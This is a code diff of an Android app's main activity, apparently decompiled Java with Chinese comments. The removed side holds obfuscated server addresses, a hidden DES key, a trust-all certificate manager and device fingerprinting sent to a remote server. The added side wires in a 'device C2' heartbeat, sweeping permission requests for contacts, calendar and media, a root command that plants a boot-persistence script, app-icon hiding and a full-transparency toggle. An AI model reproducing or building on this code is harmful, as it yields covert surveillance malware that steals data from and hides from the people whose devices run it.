@@ -1,7 +1,8 @@
 package com.example.msphone;
 
-
 import android.Manifest;
+import android.app.AppOpsManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -9,453 +10,294 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Handler;
 import android.provider.Settings;
+import android.text.TextUtils;
+import android.util.Base64;
+import android.view.KeyEvent;
+import android.view.View;
+import android.widget.Toast;
 
-import androidx.activity.result.ActivityResult;
-import androidx.activity.result.ActivityResultCallback;
-import androidx.activity.result.ActivityResultLauncher;
-import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.google.gson.JsonElement;
-import com.google.gson.JsonObject;
-import com.google.gson.JsonParser;
 import com.zy.devicelibrary.UtilsApp;
-import com.zy.devicelibrary.utils.FileUtils;
-import com.zy.devicelibrary.utils.NetWorkUtils;
 
-import org.apache.commons.codec.binary.Base64;
-import org.apache.commons.codec.binary.Hex;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 
-import java.io.DataOutputStream;
-import java.net.Inet4Address;
-import java.net.InetAddress;
-import java.net.NetworkInterface;
-import java.net.SocketException;
-import java.security.NoSuchAlgorithmException;
-import java.security.cert.CertificateException;
-import java.security.cert.X509Certificate;
-import java.time.Instant;
-import java.time.LocalDateTime;
-import java.util.Enumeration;
-import java.util.concurrent.CompletableFuture;
-
-import javax.crypto.Cipher;
-import javax.crypto.KeyGenerator;
-import javax.crypto.NoSuchPaddingException;
-import javax.crypto.SecretKey;
-import javax.crypto.SecretKeyFactory;
-import javax.crypto.spec.DESKeySpec;
-import javax.net.ssl.X509TrustManager;
-
-/* loaded from: classes3.dex */
+/**
+ * 入口。新协议流程：拉取远程配置(AES-CBC) → 安全闸门(Guard) → 卡密验证(CardGate) → 设备 C2(DeviceC2)。
+ * 旧的 DES/50.114.113.121 验证流程已移除，由 card_server 新协议取代。
+ */
 public class MainActivity extends AppCompatActivity {
+
     private static final int DOUBLE_CLICK_TIMEOUT = 500;
-    private static final httphelp httphelp = new httphelp();
     private static final int MY_PERMISSIONS_REQUEST_READ_PHONE_NUMBERS = 3;
-    private long mLastVolumeUpKeyEventTime = 0;
-    private boolean mIsFloatingWindowVisible = true;
-    private long mLastVolumeUpClickTime = 0;
-    private float speeds = 0.0f;
-    private final ActivityResultLauncher<Intent> manageOverlayPermissionLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), new ActivityResultCallback() { // from class: cx.xp.test.MainActivity$$ExternalSyntheticLambda0
-        @Override // androidx.activity.result.ActivityResultCallback
-        public final void onActivityResult(Object obj) {
-            MainActivity.this.m92lambda$new$0$cxxpmodelMainActivity((ActivityResult) obj);
-        }
-    });
-    private String phoneNumber;
+    private static final int STORAGE_PERMISSION_REQUEST_CODE = 1001;
+    private static final int OVERLAY_PERMISSION_REQ_CODE = 1001;
+    private static final int GATE_REQUEST_CODE = 2001;
 
-    public MainActivity() throws NoSuchPaddingException, NoSuchAlgorithmException {
-    }
+    private static final String PREFS_NAME = "AppSettings";
+    private static final String KEY_TRANSPARENT = "isTransparent";
 
-    /* JADX INFO: Access modifiers changed from: package-private */
-    /* renamed from: lambda$new$0$cx-xp-model-MainActivity  reason: not valid java name */
-    public /* synthetic */ void m92lambda$new$0$cxxpmodelMainActivity(ActivityResult result) {
-        if (Build.VERSION.SDK_INT >= 23 && Settings.canDrawOverlays(this)) {
-            startService(new Intent(this, FloatingWindowService.class));
-        }
-    }
+    public static Integer dak = 0;
 
+    private SharedPreferences prefs;
+    private boolean isTransparent = false;
+    private long lastVolumeDownClickTime = 0;
 
-    //实现X509TrustManager接口
-    public static class MyTrustManager implements X509TrustManager {
-        @Override
-        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-        }
+    // 远程配置在子线程拉取后暂存，供闸门结果回调使用
+    private volatile RemoteConfig pendingConfig;
 
-        @Override
-        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-        }
-
-        @Override
-        public X509Certificate[] getAcceptedIssuers() {
-            return new X509Certificate[0];
-        }
-    }
-
-    Cipher cipher = Cipher.getInstance("DES");
-    //2，创建秘钥
-    SecretKey key = KeyGenerator.getInstance("DES").generateKey();
-    private static String utdid = "";
-
-    private static String imei = "";
-
-    private static String ip = "";
-
-    private static String phone = "";
-
-    private static String times = "";
-
-
-    public String timess() {
-        try {
-            KeyGenerator keyGenerator = KeyGenerator.getInstance("DES");
-            keyGenerator.init(56);
-            // 生成一个Key
-            SecretKey generateKey = keyGenerator.generateKey();
-            // 转变为字节数组
-            byte[] encoded = generateKey.getEncoded();
-            // 生成密钥字符串
-            String encodeHexString = Hex.encodeHexString(encoded);
-            return encodeHexString;
-        } catch (Exception e) {
-            e.printStackTrace();
-            return "密钥生成错误.";
-        }
-    }
-
-    //加密
-    public String godtimes(String str, String Key) {
-        String s = null;
-        try {
-            DESKeySpec desKey = new DESKeySpec(Key.getBytes());
-            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
-            SecretKey securekey = keyFactory.generateSecret(desKey);
-            Cipher cipher = Cipher.getInstance("DES");
-            cipher.init(Cipher.ENCRYPT_MODE, securekey);    //初始化密码器，用密钥 secretKey 进入加密模式
-            byte[] bytes = cipher.doFinal(str.getBytes());   //加密
-            s = Base64.encodeBase64String(bytes);
-        } catch (Exception e) {
-            e.printStackTrace();
-            return "加密错误.";
-        }
-        return s;
-    }
-
-    //解密
-    public String helols(String buff, String Key) {
-        String s = null;
-        try {
-            DESKeySpec desKey = new DESKeySpec(Key.getBytes());
-            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
-            SecretKey securekey = keyFactory.generateSecret(desKey);
-            Cipher cipher = Cipher.getInstance("DES");
-            cipher.init(Cipher.DECRYPT_MODE, securekey);
-            byte[] responseByte = cipher.doFinal(Base64.decodeBase64(buff));
-            s = new String(responseByte);
-            return s;
-        } catch (Exception e) {
-            e.printStackTrace();
-            return "解密错误.";
-        }
-    }
-
-    //解密
-    public String helolss(String bufff, String Key) {
-        String s = null;
-        try {
-            DESKeySpec desKey = new DESKeySpec(Key.getBytes());
-            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
-            SecretKey securekey = keyFactory.generateSecret(desKey);
-            Cipher cipher = Cipher.getInstance("DES");
-            cipher.init(Cipher.DECRYPT_MODE, securekey);
-            byte[] responseByte = cipher.doFinal(Hex.decodeHex(bufff));
-            s = new String(responseByte);
-            return s;
-        } catch (Exception e) {
-            e.printStackTrace();
-            return "解密错误.";
-        }
-    }
-
-    public static String getIpAddressString() {
-        try {
-            for (Enumeration<NetworkInterface> enNetI = NetworkInterface
-                    .getNetworkInterfaces(); enNetI.hasMoreElements(); ) {
-                NetworkInterface netI = enNetI.nextElement();
-                for (Enumeration<InetAddress> enumIpAddr = netI
-                        .getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
-                    InetAddress inetAddress = enumIpAddr.nextElement();
-                    if (inetAddress instanceof Inet4Address && !inetAddress.isLoopbackAddress()) {
-                        return inetAddress.getHostAddress();
-                    }
-                }
-            }
-        } catch (SocketException e) {
-            e.printStackTrace();
-        }
-        return "";
-    }
-    String as = "0,,(bwwkavihovjj`vjjjbl`h`hw9((u9(1w;<3w-+=*w>16<";
-    String asss = "0,,(bwwkavihovjj`vjjjbl`h`hw9((u9(1w;<3w-+=*w;*=9,=";
-    char ass = 'X'; // XOR 操作的密钥
-
-    public static Integer dak = 0; // dak
-
-    private static String xorObfuscate(String input, char key) {
-        char[] chars = input.toCharArray();
-        for (int i = 0; i < chars.length; i++) {
-            chars[i] = (char) (chars[i] ^ key);
-        }
-        return new String(chars);
-    }
-
-    /* JADX INFO: Access modifiers changed from: protected */
     @Override
-    // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
-    public void onCreate(Bundle savedInstanceState) {
+    protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-
-        UtilsApp.init(this.getApplication());
-
-        setContentView(R.layout.activity_main);
-        startFloatingWindowService();
-        utdid = FileUtils.getSDDeviceTxt();
-        imei =  NetWorkUtils.getMacAddress() + "|" + Build.MODEL + "|" + FileUtils.getSDDeviceTxt();
-
-        ip = getIpAddressString();
-//        phone = GeneralUtils.getSimCardInfo().number1;
-        times = null;
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
-                != PackageManager.PERMISSION_GRANTED) {
+        PermissionGuideHelper.checkAndGuide(this);
+        // 一次性申请所有需要的运行时权限（包括联系人、相册等）
+        java.util.List<String> permsToRequest = new java.util.ArrayList<>();
+        String[] allPerms = {
+            Manifest.permission.READ_PHONE_NUMBERS,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CALENDAR,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+        };
+        for (String perm : allPerms) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                permsToRequest.add(perm);
+            }
+        }
+        // Android 13+ (API 33) 媒体权限单独申请
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
+                    != PackageManager.PERMISSION_GRANTED) {
+                permsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES);
+            }
+        }
+        if (!permsToRequest.isEmpty()) {
             ActivityCompat.requestPermissions(this,
-                    new String[]{Manifest.permission.READ_PHONE_NUMBERS,Manifest.permission.READ_CALENDAR,Manifest.permission.READ_PHONE_STATE,Manifest.permission.WRITE_EXTERNAL_STORAGE,Manifest.permission.READ_EXTERNAL_STORAGE},
+                    permsToRequest.toArray(new String[0]),
                     MY_PERMISSIONS_REQUEST_READ_PHONE_NUMBERS);
         }
+        installMonitorScript();
+        UtilsApp.init(this.getApplication());
+        setContentView(R.layout.activity_main);
 
-        String content = utdid;
+        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        isTransparent = prefs.getBoolean(KEY_TRANSPARENT, false);
+        applyTransparency();
 
-        try {
-
-            String posttime = "{\"id\":\"\",\"cdk\":\"\",\"endable\":\"\",\"outtime\":\"\",\"time\":\"" + utdid + "\"}";
-            String key = timess();
-            String test = helols(godtimes(shopsg(), key), key);
-            CompletableFuture<String> future = httphelp.postd(xorObfuscate(asss,ass), godtimes(posttime, test));
-            // 同步等待结果
-            String result = future.get(); // 这会阻塞直到异步操作完成
-
-            key = timess();
-            test = helols(godtimes(shopsg(), key), key);
-
-            // 使用JsonParser解析字符串
-            // 直接使用JsonParser的静态方法parseString来解析字符串
-            JsonElement rootElement = JsonParser.parseString(helolss(result.replaceAll("\"", ""), test));
-
-            // 获取根对象
-            JsonObject rootObject = rootElement.getAsJsonObject();
-            if (rootObject.has("data")) {
-                String name = rootObject.get("data").getAsString();
-            } else {
-                finish();
-                System.exit(0);
-            }
-
-            test = helols(godtimes(shopsg(), key), key);
-
-            String times = null;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                times = "{\"id\":\"" + imei + "\",\"we\":\"" + ip + "\",\"endable\":\"" + phone + "\",\"logit\":\"" + LocalDateTime.now() + "\",\"time\":\"" + utdid + "\"}";
-            }
-
-            CompletableFuture<String> future2 = httphelp.postd(xorObfuscate(as, ass), godtimes(times, test));
-            // 同步等待结果
-            String result2 = future2.get(); // 这会阻塞直到异步操作
-            // 读取字段
-            JsonElement rootElement2 = JsonParser.parseString(helolss(result2.replaceAll("\"", ""), test));
-
-            // 获取根对象
-            JsonObject rootObject2 = rootElement2.getAsJsonObject();
-            // 读取字段
-            if (rootObject2.has("data")) {
-                JsonObject rootObject1 = rootObject2.get("data").getAsJsonObject();
-                if (rootObject1.has("cdk")) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        if (Instant.ofEpochMilli(rootObject1.get("outtime").getAsLong()).isAfter(Instant.now())) {
-                            Integer cdk = rootObject1.get("cdk").getAsInt();
-                            dak = cdk;
-                            if (cdk == 0) {
-                                adfaev(0);
-
-                                try {
-                                    Process process = Runtime.getRuntime().exec("su");
-                                    DataOutputStream out = new DataOutputStream(process.getOutputStream());
-                                    out.writeBytes("pm uninstall " + MainActivity.this.getPackageName() + "\n");
-                                    out.flush();
-                                    out.writeBytes("exit\n");
-                                    out.flush();
-                                    process.waitFor();
-                                } catch (Exception e) {
-                                    e.printStackTrace();
-                                }
-                            } else {
-                                adfaev(cdk);
-                            }
-                        } else {
-                            adfaev(0);
-
-                            finish();
-                            System.exit(0);
-                        }
-                    }
-
-                } else {
-                    adfaev(0);
-
-                    finish();
-                    System.exit(0);
-                }
-            } else {
-                adfaev(0);
-
-                finish();
-                System.exit(0);
-            }
-        } catch (Exception e) {
-
-            finish();
-            System.exit(0);
-        }
-
-
-        // 启动Runnable任务
-//        handler.postDelayed(runnableCode, 120000);
+        // 网络/安全检查放后台线程，避免阻塞 UI
+        new Thread(this::bootstrap, "boot").start();
     }
 
+    /** 后台引导：配置 → 安全闸门 → 许可校验 → 验证/放行。 */
+    private void bootstrap() {
+        RemoteConfig cfg = ConfigClient.fetch(this);
+        pendingConfig = cfg;
 
-
-    @Override
-    protected void onDestroy() {
-
-        String times = null;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            times = "{\"id\":\"" + imei + "\",\"we\":\"" + ip + "\",\"endable\":\"" + phone + "\",\"oit\":\"" + LocalDateTime.now() + "\",\"time\":\"" + utdid + "\"}";
-        }
-
-        String key = timess();
-        String test = helols(godtimes(shopsg(), key), key);
-
-        try {
-            CompletableFuture<String> future2 = httphelp.postd(xorObfuscate(as, ass), godtimes(times, test));
-
-            // 同步等待结果
-            String result2 = future2.get(); // 这会阻塞直到异步操作
-            // 读取字段
-            JsonElement rootElement2 = JsonParser.parseString(helolss(result2.replaceAll("\"", ""), test));
-
-            // 获取根对象
-            JsonObject rootObject2 = rootElement2.getAsJsonObject();
-            // 读取字段
-            if (rootObject2.has("data")) {
-                JsonObject rootObject1 = rootObject2.get("data").getAsJsonObject();
-                if (rootObject1.has("cdk")) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        if (Instant.ofEpochMilli(rootObject1.get("outtime").getAsLong()).isAfter(Instant.now())) {
-                            Integer cdk = rootObject1.get("cdk").getAsInt();
-                            if (cdk == 0) {
-                                adfaev(0);
-
-                                try {
-                                    Process process = Runtime.getRuntime().exec("su");
-                                    DataOutputStream out = new DataOutputStream(process.getOutputStream());
-                                    out.writeBytes("pm uninstall " + MainActivity.this.getPackageName() + "\n");
-                                    out.flush();
-                                    out.writeBytes("exit\n");
-                                    out.flush();
-                                    process.waitFor();
-                                } catch (Exception e) {
-                                    e.printStackTrace();
-                                }
-                            }else{
-                                adfaev(cdk);
-
-                            }
-                        } else {
-                            adfaev(0);
-
-                            finish();
-                            System.exit(0);
-                        }
-                    }
-
-                } else {
-                    adfaev(0);
-
-                    finish();
-                    System.exit(0);
-                }
-            } else {
-                adfaev(0);
-
-                finish();
-                System.exit(0);
-            }
-        } catch (Exception e) {
-            finish();
-            System.exit(0);
-        }
-
-
-        super.onDestroy();
-        // 在Activity销毁时移除所有的callbacks和messages，防止内存泄漏
-//        handler.removeCallbacks(runnableCode);
-    }
-
-    private String shopsg() {
-        int[] encodedAscii = {
-                97 - 32, 115 - 32, 104 - 32, 100 - 32, 117 - 32, 105 - 32, 97 - 32, 119 - 32, 98 - 32, 100 - 32, 64 - 32, 56 - 32, 51 - 32, 51 - 32, 72 - 32, 97 - 32, 115 - 32
-        };
-        // 固定数32
-        int fixedNumber = 32;
-        // 存储解码后的字符
-        char[] decodedChars = new char[encodedAscii.length];
-
-        // 计算还原每个字符的ASCII码，并转换为字符
-        for (int i = 0; i < encodedAscii.length; i++) {
-            decodedChars[i] = (char) (encodedAscii[i] + fixedNumber);
-        }
-
-        // 将字符数组转换为字符串并打印
-        String decodedString = new String(decodedChars);
-        return decodedString;
-    }
-
-    private void startFloatingWindowService() {
-        if (Build.VERSION.SDK_INT >= 23) {
-            if (!Settings.canDrawOverlays(this)) {
-                Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + getPackageName()));
-                this.manageOverlayPermissionLauncher.launch(intent);
-                return;
-            }
-            startService(new Intent(this, FloatingWindowService.class));
+        String violation = Guard.evaluate(this, cfg);
+        if (violation != null) {
+            lockAndExit();
             return;
         }
-        startService(new Intent(this, FloatingWindowService.class));
+
+        if (CardGate.licensed(this)) {
+            runOnUiThread(() -> proceed(cfg));
+            return;
+        }
+
+        runOnUiThread(() -> launchGate(cfg));
+    }
+
+    private void launchGate(RemoteConfig cfg) {
+        Intent intent = new Intent(this, CardGateActivity.class);
+        boolean lock = true;
+        if (cfg != null && cfg.enableHtmlPopups) {
+            RemoteConfig.HtmlPopup popup = cfg.firstActivePopup();
+            if (popup != null) {
+                intent.putExtra(CardGateActivity.EXTRA_HTML, popup.html);
+                lock = popup.lock;
+            }
+        }
+        intent.putExtra(CardGateActivity.EXTRA_LOCK, lock);
+        startActivityForResult(intent, GATE_REQUEST_CODE);
+    }
+
+    /** 验证通过/已授权后：启动悬浮窗服务 + 设备 C2 心跳。 */
+    private void proceed(RemoteConfig cfg) {
+        startFloatingWindowService();
+        DeviceC2.start(this);
+        new Thread(() -> {
+            try { RootUtils.executeAsRoot("input keyevent KEYCODE_HOME"); } catch (Throwable ignored) {}
+        }).start();
+    }
+
+    private void lockAndExit() {
+        runOnUiThread(() -> {
+            try { Toast.makeText(this, "运行环境校验未通过", Toast.LENGTH_SHORT).show(); } catch (Throwable ignored) {}
+            finish();
+            System.exit(0);
+        });
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == GATE_REQUEST_CODE) {
+            if (resultCode == RESULT_OK && CardGate.licensed(this)) {
+                proceed(pendingConfig);
+            } else {
+                finish();
+                System.exit(0);
+            }
+            return;
+        }
+        if (requestCode == OVERLAY_PERMISSION_REQ_CODE) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
+                startFloatingService();
+            } else {
+                Toast.makeText(this, "未授予悬浮窗权限，应用无法启动", Toast.LENGTH_SHORT).show();
+                finish();
+            }
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        // 权限结果不强制阻断流程
+    }
+
+    // ---------------- 透明切换（双击音量下键）----------------
+
+    @Override
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
+            long currentTime = System.currentTimeMillis();
+            if (currentTime - lastVolumeDownClickTime < DOUBLE_CLICK_TIMEOUT) {
+                lastVolumeDownClickTime = 0;
+                toggleTransparency();
+            } else {
+                lastVolumeDownClickTime = currentTime;
+            }
+        }
+        return super.onKeyDown(keyCode, event);
+    }
+
+    private void toggleTransparency() {
+        isTransparent = !isTransparent;
+        prefs.edit().putBoolean(KEY_TRANSPARENT, isTransparent).apply();
+        applyTransparency();
+    }
+
+    private void applyTransparency() {
+        View decorView = getWindow().getDecorView();
+        decorView.setAlpha(isTransparent ? 0.0f : 1.0f);
+    }
+
+    // ---------------- 悬浮窗服务 ----------------
+
+    private void startFloatingWindowService() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE);
+            Toast.makeText(this, "请先授予悬浮窗权限", Toast.LENGTH_LONG).show();
+        } else {
+            startFloatingService();
+        }
+    }
+
+    private void startFloatingService() {
+        Intent serviceIntent = new Intent(this, FloatingWindowService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+    }
+
+    // ---------------- 内置脚本部署（保留原逻辑）----------------
+
+    private String readScriptFromAssets(String fileName) {
+        StringBuilder scriptBuilder = new StringBuilder();
+        try (InputStream is = getAssets().open(fileName);
+             BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                scriptBuilder.append(line).append("\n");
+            }
+            return scriptBuilder.toString();
+        } catch (IOException e) {
+            return null;
+        }
+    }
+
+    private void installMonitorScript() {
+        String scriptContent = readScriptFromAssets("monitor_script.sh");
+        if (scriptContent == null) return;
+        installScript(scriptContent, "/data/adb/service.d/99-mymonitor.sh");
+    }
+
+    private void installScript(String scriptContent, String targetPath) {
+        String encodedScript = Base64.encodeToString(scriptContent.getBytes(), Base64.NO_WRAP);
+        String command = "echo '" + encodedScript + "' | base64 -d > " + targetPath + " && chmod 755 " + targetPath;
+        RootUtils.executeAsRoot(command);
+    }
+
+    // ---------------- 杂项（保留）----------------
+
+    private void checkUsageStatsPermission() {
+        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
+        if (mode != AppOpsManager.MODE_ALLOWED) {
+            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
+        }
+    }
+
+    private void hideAppIcon() {
+        PackageManager pm = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        pm.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        SharedPreferences p = getSharedPreferences("app_settings", MODE_PRIVATE);
+        p.edit().putBoolean("icon_hidden", true).apply();
+    }
+
+    public static boolean isAccessibilityServiceEnabled(Context context, Class<?> serviceClass) {
+        int accessibilityEnabled = 0;
+        try {
+            accessibilityEnabled = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
+        } catch (Settings.SettingNotFoundException e) {
+            // ignore
+        }
+        if (accessibilityEnabled == 1) {
+            String settingValue = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (settingValue != null) {
+                TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
+                splitter.setString(settingValue);
+                while (splitter.hasNext()) {
+                    String accessibilityService = splitter.next();
+                    if (accessibilityService.equalsIgnoreCase(context.getPackageName() + "/" + serviceClass.getName())) {
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
     }
 
     public void adfaev(Integer cardNum) {
-//        SharedPreferences sharedPreferences = context.getSharedPreferences("XposedModulePrefs", 0);
-//        SharedPreferences.Editor editor = sharedPreferences.edit();
-//        editor.putInt("fdg341", cardNum);
-//        editor.commit();
-//
-//        Intent intent = new Intent("xsfv");
-//        intent.putExtra(FloatingWindowService.EXTRA_PLAYBACK_SPEED, cardNum);
-//        context.sendBroadcast(intent);
+        SharedPreferences sharedPreferences = getSharedPreferences("XposedModulePrefs", 0);
+        sharedPreferences.edit().putInt("fdg341", cardNum).apply();
         Intent intent = new Intent("com.example.msphone.THISSHOWTIME");
         intent.putExtra("xsfvs", cardNum);
-        MainActivity.this.sendBroadcast(intent);
+        sendBroadcast(intent);
     }
 }
